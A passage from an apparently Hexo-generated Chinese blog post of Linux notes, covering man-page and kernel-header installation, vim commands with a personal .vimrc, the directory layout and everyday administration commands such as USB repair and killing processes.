class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt update</span><br><span class=\"line\">sudo apt install manpages-zh</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>Arch Linux:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pacman -Syu</span><br><span class=\"line\">pacman -S man-pages-zh_cn man-pages-zh_tw</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>Red Hat / CentOS:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum update</span><br><span class=\"line\">yum install man-pages-zh-CN</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>Fedora:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dnf update</span><br><span class=\"line\">dnf install man-pages-zh-CN</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"kali内核更新安装\"><a href=\"#kali内核更新安装\" class=\"headerlink\" title=\"kali内核更新安装\"></a>kali内核更新安装</h3><ol>\n<li>查看内核版本</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname -r</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>检查linux是否安装对应的头文件</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-cache search linux-headers</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>安装更新头文件</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install linux-headers-$(uname -r)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>内核头文件检测是否安装</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo dpkg-query -s linux-headers-`uname -r`</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"vim命令\"><a href=\"#vim命令\" class=\"headerlink\" title=\"vim命令\"></a>vim命令</h3><ol>\n<li>:set number 显示行号</li>\n<li>:set 取消行号</li>\n<li>xG:跳转到指定的第x行，G移动到文件末尾行</li>\n<li>dd ：剪切一行， yy：复制一行</li>\n<li>D：剪切一个字符，y：复制一个字符</li>\n<li>p：粘贴</li>\n<li>dxw：删除光标右边x个字符</li>\n<li>dxh：删除光标左边x个字符</li>\n<li>:x 删除一个字符</li>\n<li>/string :查找字符 n:向上查找，N：向下查找</li>\n<li>:范围 s/oldword/newword/g  字符替换 %s全文查找，g为global，全局替换</li>\n</ol>\n<ul>\n<li>vim规则总结</li>\n</ul>\n<p>（1）一般是操作字符+被操作的量</p>\n<p>（2）$ 为结尾， 0 为开头</p>\n<ul>\n<li><p>vim简单配置：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;===================</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>适合自己用的vimrc配置文件</span><br><span class=\"line\"><span class=\"string\">&quot;===================</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>设置编码</span><br><span class=\"line\"><span class=\"built_in\">set</span> fileencodings=utf<span class=\"number\">-8</span>,ucs-bom,gb18030,gbk,gb2312,cp936</span><br><span class=\"line\"><span class=\"built_in\">set</span> termencoding=utf<span class=\"number\">-8</span></span><br><span class=\"line\"><span class=\"built_in\">set</span> encoding=utf<span class=\"number\">-8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;保存.vimrc文件时自动重启加载，即让此文件立即生效</span></span><br><span class=\"line\"><span class=\"string\">autocmd BufWritePost $MYVIMRC source $MYVIMRC</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>语法高亮</span><br><span class=\"line\">syntax on</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;设置ruler会在右下角显示光标所在的行号和列号,不方便查看,改成设置状态栏显示内容</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span><span class=\"built_in\">set</span> ruler</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;设置状态行显示的内容. %F: 显示当前文件的完整路径. %r: 如果readonly,会显示[RO]</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>%B: 显示光标下字符的编码值,十六进制. %l:光标所在的行号. %v:光标所在的虚拟列号.</span><br><span class=\"line\"><span class=\"string\">&quot;%P: 显示当前内容在整个文件中的百分比. %H和%M是strftime()函数的参数,获取时间.</span></span><br><span class=\"line\"><span class=\"string\">set statusline=%F%r\\ [HEX=%B][%l,%v,%P]\\ %&#123;strftime(\\&quot;%H:%M\\&quot;)&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>显示行号</span><br><span class=\"line\"><span class=\"built_in\">set</span> nu <span class=\"string\">&quot;等同于 set number</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>突出显示当前行</span><br><span class=\"line\"><span class=\"built_in\">set</span> cursorline <span class=\"string\">&quot;等同于 set cul</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>突出显示当前列</span><br><span class=\"line\"><span class=\"built_in\">set</span> cursorcolumn <span class=\"string\">&quot;等同于 set cuc</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>共享剪贴板  </span><br><span class=\"line\"><span class=\"built_in\">set</span> clipboard+=unnamed </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;从不备份  </span></span><br><span class=\"line\"><span class=\"string\">set nobackup</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>自动保存</span><br><span class=\"line\"><span class=\"built_in\">set</span> autowrite</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;隐藏工具栏</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span><span class=\"built_in\">set</span> guioptions-=T</span><br><span class=\"line\"><span class=\"string\">&quot;隐藏菜单栏</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span><span class=\"built_in\">set</span> guioptions-=m</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;高亮显示所有搜索到的内容.后面用map映射快捷键来方便关闭当前搜索的高亮.</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span><span class=\"built_in\">set</span> hlsearch</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;光标立刻跳转到搜索到内容</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span><span class=\"built_in\">set</span> incsearch</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;搜索到最后匹配的位置后,再次搜索不回到第一个匹配处</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span><span class=\"built_in\">set</span> nowrapscan</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;去掉输入错误时的提示声音</span></span><br><span class=\"line\"><span class=\"string\">set noeb</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span> 默认按下Esc后,需要等待<span class=\"number\">1</span>秒才生效,设置Esc超时时间为<span class=\"number\">100</span>ms,尽快生效</span><br><span class=\"line\"><span class=\"built_in\">set</span> ttimeout</span><br><span class=\"line\"><span class=\"built_in\">set</span> ttimeoutlen=<span class=\"number\">100</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;在处理未保存或只读文件的时候，弹出确认</span></span><br><span class=\"line\"><span class=\"string\">set confirm</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>让Backspace键可以往前删除字符.</span><br><span class=\"line\"><span class=\"string\">&quot;Debian系统自带的vim版本会加载一个debian.vim文件,默认已经设置这一项,</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>可以正常使用Backspace键.如果使用自己编译的vim版本,并自行配置.vimrc文件,</span><br><span class=\"line\"><span class=\"string\">&quot;可能就没有设置这一项,导致Backspace键用不了,或者时灵时不灵.所以主动配置.</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>使回格键（backspace）正常处理indent, eol, start等</span><br><span class=\"line\"><span class=\"built_in\">set</span> backspace=indent,eol,start</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;允许backspace和光标键跨越行边界</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span><span class=\"built_in\">set</span> whichwrap+=&lt;,&gt;,h,l</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;去掉有关vi一致性模式,避免操作习惯上的局限.</span></span><br><span class=\"line\"><span class=\"string\">set nocompatible</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>FIXME 在MS-DOS控制台打开vim时,控制台使用鼠标右键来复制粘贴,设置</span><br><span class=\"line\"><span class=\"string\">&quot;全鼠标模式,鼠标右键被映射为visual mode,不能用来复制粘贴,不方便.</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>但是如果不设置鼠标模式,会无法使用鼠标滚轮来滚动界面.经过验证,发现</span><br><span class=\"line\"><span class=\"string\">&quot;可以设成普通模式mouse=n来使用鼠标滚轮,也能使用鼠标右键复制粘贴.</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span> mouse=c/mouse=i模式都不能用鼠标滚轮. Linux下还是要设成 mouse=a</span><br><span class=\"line\"><span class=\"built_in\">set</span> mouse=n</span><br><span class=\"line\"><span class=\"string\">&quot;set selection=exclusive</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span><span class=\"built_in\">set</span> selectmode=mouse,key</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;高亮显示括号匹配</span></span><br><span class=\"line\"><span class=\"string\">set showmatch</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>设置Tab长度为<span class=\"number\">4</span>空格</span><br><span class=\"line\"><span class=\"built_in\">set</span> tabstop=<span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"string\">&quot;设置自动缩进长度为4空格</span></span><br><span class=\"line\"><span class=\"string\">set shiftwidth=4</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>自动缩进,这个导致从外面拷贝多行以空格开头的内容时,会有多的缩进,先不设置</span><br><span class=\"line\"><span class=\"string\">&quot;set autoindent</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>不要用空格代替制表符</span><br><span class=\"line\"><span class=\"built_in\">set</span> noexpandtab</span><br><span class=\"line\"><span class=\"string\">&quot;输入tab制表符时，自动替换成空格</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span><span class=\"built_in\">set</span> expandtab</span><br><span class=\"line\"><span class=\"string\">&quot;设置softtabstop有一个好处是可以用Backspace键来一次删除4个空格.</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>softtabstop的值为负数,会使用shiftwidth的值,两者保持一致,方便统一缩进.</span><br><span class=\"line\"><span class=\"string\">&quot;set softtabstop=4</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>显示空格和tab键</span><br><span class=\"line\"><span class=\"built_in\">set</span> listchars=tab:&gt;-,trail:-</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;1=启动显示状态行, 2=总是显示状态行.设置总是显示状态行,方便看到当前文件名</span></span><br><span class=\"line\"><span class=\"string\">set laststatus=2</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>自动补全</span><br><span class=\"line\">:inoremap ( ()&lt;ESC&gt;i</span><br><span class=\"line\">:inoremap ) &lt;c-r&gt;=ClosePair(<span class=\"string\">&#x27;)&#x27;</span>)&lt;CR&gt;</span><br><span class=\"line\">:inoremap &#123; &#123;&lt;CR&gt;&#125;&lt;ESC&gt;O</span><br><span class=\"line\">:inoremap &#125; &lt;c-r&gt;=ClosePair(<span class=\"string\">&#x27;&#125;&#x27;</span>)&lt;CR&gt;</span><br><span class=\"line\">:inoremap [ []&lt;ESC&gt;i</span><br><span class=\"line\">:inoremap ] &lt;c-r&gt;=ClosePair(<span class=\"string\">&#x27;]&#x27;</span>)&lt;CR&gt;</span><br><span class=\"line\">:inoremap <span class=\"string\">&quot; &quot;</span><span class=\"string\">&quot;&lt;ESC&gt;i</span></span><br><span class=\"line\"><span class=\"string\">:inoremap &#x27; &#x27;&#x27;&lt;ESC&gt;i</span></span><br><span class=\"line\"><span class=\"string\">function! ClosePair(char)</span></span><br><span class=\"line\"><span class=\"string\">    if getline(&#x27;.&#x27;)[col(&#x27;.&#x27;) - 1] == a:char</span></span><br><span class=\"line\"><span class=\"string\">        return &quot;</span>\\&lt;Right&gt;<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">    else</span></span><br><span class=\"line\"><span class=\"string\">        return a:char</span></span><br><span class=\"line\"><span class=\"string\">    endif</span></span><br><span class=\"line\"><span class=\"string\">endfunction </span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>打开文件类型检测,并载入文件类型插件,为特定文件类型载入相关缩进文</span><br><span class=\"line\">filetype plugin indent on</span><br><span class=\"line\"><span class=\"string\">&quot; 设置自动补全的选项. longest表示只自动补全最大匹配的部分,剩余部分通过</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span> CTRL-P/CTRL-N来选择匹配项进行补全. menu表示弹出可补全的内容列表.</span><br><span class=\"line\"><span class=\"string\">&quot; 如果有多个匹配,longest选项不会自动选中并完整补全,要多按一次CTRL-P,比较</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span> 麻烦,不做设置,保持默认设置,vim默认没有设置longest.</span><br><span class=\"line\"><span class=\"string\">&quot;set completeopt=longest,menu &quot;</span>启用这句才会开启自动补全</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;=============显示中文帮助</span></span><br><span class=\"line\"><span class=\"string\">if version &gt;= 603</span></span><br><span class=\"line\"><span class=\"string\">    set helplang=cn</span></span><br><span class=\"line\"><span class=\"string\">    set encoding=utf-8</span></span><br><span class=\"line\"><span class=\"string\">endif</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>=============新建.c,.h,.sh,.java文件，自动插入文件头 </span><br><span class=\"line\">autocmd BufNewFile *.cpp,*.[ch],*.sh,*.java exec <span class=\"string\">&quot;:call SetTitle()&quot;</span> </span><br><span class=\"line\"><span class=\"string\">&quot;&quot;</span>定义函数SetTitle，自动插入文件头 </span><br><span class=\"line\">func SetTitle() </span><br><span class=\"line\">    <span class=\"string\">&quot;如果文件类型为.sh文件 </span></span><br><span class=\"line\"><span class=\"string\">    if &amp;filetype == &#x27;sh&#x27; </span></span><br><span class=\"line\"><span class=\"string\">        call setline(1,&quot;</span>\\############################<span class=\"string\">&quot;) </span></span><br><span class=\"line\"><span class=\"string\">        call append(line(&quot;</span>.<span class=\"string\">&quot;), &quot;</span>\\# File Name: <span class=\"string\">&quot;.expand(&quot;</span>%<span class=\"string\">&quot;)) </span></span><br><span class=\"line\"><span class=\"string\">        call append(line(&quot;</span>.<span class=\"string\">&quot;)+1, &quot;</span>\\# Author: Li Ziqiang<span class=\"string\">&quot;) </span></span><br><span class=\"line\"><span class=\"string\">        call append(line(&quot;</span>.<span class=\"string\">&quot;)+2, &quot;</span>\\<span class=\"meta\"># mail: 2296557984@qq.com<span class=\"meta-string\">&quot;) </span></span></span><br><span class=\"line\"><span class=\"meta-string\"><span class=\"meta\">        call append(line(&quot;</span>.<span class=\"meta-string\">&quot;)+3, &quot;</span>\\# Created Time: <span class=\"meta-string\">&quot;.strftime(&quot;</span>%c<span class=\"meta-string\">&quot;))</span></span></span><br><span class=\"line\"><span class=\"meta-string\"><span class=\"meta\">        call append(line(&quot;</span>.<span class=\"meta-string\">&quot;)+4, &quot;</span>\\############################<span class=\"meta-string\">&quot;) </span></span></span><br><span class=\"line\"><span class=\"meta-string\"><span class=\"meta\">        call append(line(&quot;</span>.<span class=\"meta-string\">&quot;)+5, &quot;</span>\\#!/bin/bash<span class=\"meta-string\">&quot;) </span></span></span><br><span class=\"line\"><span class=\"meta-string\"><span class=\"meta\">        call append(line(&quot;</span>.<span class=\"meta-string\">&quot;)+6, &quot;</span><span class=\"meta-string\">&quot;) </span></span></span><br><span class=\"line\"><span class=\"meta-string\"><span class=\"meta\">    else </span></span></span><br><span class=\"line\"><span class=\"meta-string\"><span class=\"meta\">        call setline(1, &quot;</span><span class=\"comment\">/******************************&quot;) </span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"meta\">        call append(line(&quot;.&quot;), &quot;    &gt; File Name: &quot;.expand(&quot;%&quot;)) </span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"meta\">        call append(line(&quot;.&quot;)+1, &quot;    &gt; Author:Li Ziqiang&quot;) </span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"meta\">        call append(line(&quot;.&quot;)+2, &quot;    &gt; Mail: 2296557984@qq.com &quot;) </span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"meta\">        call append(line(&quot;.&quot;)+3, &quot;    &gt; Created Time: &quot;.strftime(&quot;%c&quot;)) </span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"meta\">        call append(line(&quot;.&quot;)+4, &quot; *****************************/</span><span class=\"meta-string\">&quot;) </span></span></span><br><span class=\"line\"><span class=\"meta-string\"><span class=\"meta\">        call append(line(&quot;</span>.<span class=\"meta-string\">&quot;)+5, &quot;</span><span class=\"meta-string\">&quot;)</span></span></span><br><span class=\"line\"><span class=\"meta-string\"><span class=\"meta\">    endif</span></span></span><br><span class=\"line\"><span class=\"meta-string\"><span class=\"meta\"></span></span></span><br><span class=\"line\"><span class=\"meta-string\"><span class=\"meta\">    &quot;</span>新建文件后，自动定位到文件末尾</span></span><br><span class=\"line\">    autocmd BufNewFile * normal G</span><br><span class=\"line\">endfunc </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ul>\n","site":{"data":{}},"excerpt":"<p><a href=\"https://book.apeland.cn/details/189/\">本笔记的友情链接</a></p>\n<h2 id=\"常用目录介绍\"><a href=\"#常用目录介绍\" class=\"headerlink\" title=\"常用目录介绍\"></a>常用目录介绍</h2><ol>\n<li>boot    存放启动文件</li>\n<li>dev     存放设备文件</li>\n<li>etc     存放配置文件</li>\n<li>home    普通用户家目录，以/home/$username的方式存放</li>\n<li>media   移动存储自动挂载目录,以 /media/$device_name的方式来存放</li>\n<li>mnt     手动挂载目录</li>\n<li>opt     三方软件安装目录</li>\n<li>proc    内存系统文件</li>\n<li>root    管理员家目录</li>\n<li>run     里面的东西是系统运行时需要的, 不能随便删除. 但是重启的时候应该抛弃. 下次系统运行时重新生成</li>\n<li>srv     服务相关数据</li>\n<li>sys     系统文件</li>\n<li>tmp     临时文件夹</li>\n<li>usr     存放库文件、文档、命令、用户数据等</li>\n<li>var     日志存放lib     库文件","more":"</li>\n</ol>\n<ul>\n<li>-echo相当于python中的print，即输出、打印的意思</li>\n</ul>\n<h2 id=\"linux基本命令\"><a href=\"#linux基本命令\" class=\"headerlink\" title=\"linux基本命令\"></a>linux基本命令</h2><h3 id=\"命令-命令选项-参数\"><a href=\"#命令-命令选项-参数\" class=\"headerlink\" title=\"命令[命令选项][参数]\"></a>命令[命令选项][参数]</h3><p>​    {必选项}， [可选项]</p>\n<p>1）清屏命令：clear      快捷键  ctrl+l<br>2）帮助命令：man<br>3）进入文件夹命令: cd  【change dir，cd理解为改变目录的意思】<br>4）列出当前目录内容命令：ls   [-a -l -d ] 【list】<br>5）显示主机名：hostname<br>6）显示日期时间：date [-s %F]<br>7）显示日历：cal<br>8）计算器：bc<br>9）重启命令：reboot     shutdown -r      init 6<br>10）注销命令：logout<br>11）关机命令：halt      shutdown -h         init 0<br>12) 显示当前操作系统和机器的信息: uname<br>13) 显示当前路径: pwd 【定位自己的位置】</p>\n<p>-多个命令选项可以用一个 — 拼凑在一起，若命令产生了冲突，则以排最后的为主<br>-命令选项写全称时，前面加 — —</p>\n<ul>\n<li><p>从命令行启动图形界面的默认图片查看器</p>\n<p>​    运行命令：xdg-open filename.png</p>\n</li>\n<li><p>在命令行打开一个图片:</p>\n<ol>\n<li><p>apt install fim</p>\n</li>\n<li><p>fim filename.png</p>\n<ul>\n<li><p>fim是fbi的升级版</p>\n<p><a href=\"http://www.itpro.net.cn/2019/12/linux\">有关于fim的操作链接</a></p>\n</li>\n</ul>\n</li>\n</ol>\n</li>\n<li><p>apt 与apt-get 的区别：apt-get 是 apt 的子集</p>\n</li>\n<li><p>更新安装包：apt upgrade</p>\n</li>\n</ul>\n<h3 id=\"安装内核头文件\"><a href=\"#安装内核头文件\" class=\"headerlink\" title=\"安装内核头文件\"></a>安装内核头文件</h3><ul>\n<li>输入命令：apt-get install linux-headers-$(uname -r)或者直接敲apt-get install linux-headers-在这时候你按键盘上的tab键，找你本系统的头文件安装即可</li>\n</ul>\n<h3 id=\"安装照相机\"><a href=\"#安装照相机\" class=\"headerlink\" title=\"安装照相机\"></a>安装照相机</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install cheese</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"u盘修改只读模式\"><a href=\"#u盘修改只读模式\" class=\"headerlink\" title=\"u盘修改只读模式\"></a>u盘修改只读模式</h3><ol>\n<li>查看U盘分区</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo fdisk -l</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>查看U盘的挂载点</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">df U盘分区</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>卸载原挂载的U盘</li>\n<li>修复U盘的文件管理系统</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo dosfsck -v -a [U盘分区]</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>重新挂载</li>\n</ol>\n<h3 id=\"蓝牙\"><a href=\"#蓝牙\" class=\"headerlink\" title=\"蓝牙\"></a>蓝牙</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo service bluetooth start  //打开蓝牙配适器</span><br><span class=\"line\">sudo service bluetooth stop   //关闭蓝牙配适器</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关闭进程\"><a href=\"#关闭进程\" class=\"headerlink\" title=\"关闭进程\"></a>关闭进程</h3><ul>\n<li>有时候应用被我们1关闭了，可它还在后台运行，这就要求我们手动关闭进程</li>\n<li>kill -9 进程IP    //可利用htop命令查看进程IP</li>\n<li>若没有htop，可下载</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install htop</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"卸载-IntelliJ-IDEA-类似卸载可参考\"><a href=\"#卸载-IntelliJ-IDEA-类似卸载可参考\" class=\"headerlink\" title=\"卸载 IntelliJ IDEA(类似卸载可参考)\"></a>卸载 IntelliJ IDEA(类似卸载可参考)</h3><ol>\n<li>寻找Intellij IDEA 里面是否有uninstall.sh文件，有就能直接卸载</li>\n<li>若没有，则在里面找说明文档，找到相关配置文件所在的目录，将IntelliJ IDEA 文件夹及其相关配置文件一起删除</li>\n<li>可能会存在开始菜单栏里依然有图标显示的问题，</li>\n</ol>\n<figure 